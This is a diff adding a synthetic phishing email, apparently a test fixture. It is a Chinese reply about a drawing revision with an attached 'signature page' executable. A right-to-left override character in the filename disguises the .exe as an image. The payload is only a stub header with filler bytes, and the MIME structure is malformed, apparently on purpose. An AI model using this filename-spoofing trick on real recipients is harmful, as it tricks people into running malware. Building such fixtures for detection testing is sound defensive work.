@@ -1,0 +1,22 @@
+From: =?utf-8?B?6LW15bel?= <zhao@partner-relay5.example>
+To: eng@corp.internal
+Date: Thu, 10 Sep 2026 08:18:00 +0800
+Message-ID: <0008-b18@synth.example>
+In-Reply-To: <dwg-v4@corp.internal>
+Subject: Re: 图纸第4版
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+签字页更新，见附件。
+--BS
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="‮gnp.exe_签字页.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJA=
+--BS--
